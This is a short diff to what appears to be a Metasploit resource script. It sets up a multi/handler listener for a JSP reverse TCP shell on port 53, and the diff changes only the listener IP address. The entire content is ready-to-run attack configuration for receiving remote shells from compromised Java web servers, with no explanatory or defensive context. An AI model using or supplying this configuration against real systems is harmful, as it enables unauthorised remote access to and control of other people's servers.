@@ -2,7 +2,7 @@
 
 use exploit/multi/handler
 set PAYLOAD java/jsp_shell_reverse_tcp
-set LHOST 10.11.0.40
+set LHOST 10.11.0.107
 set LPORT 53
 set ExitOnSession false
 exploit -j -z
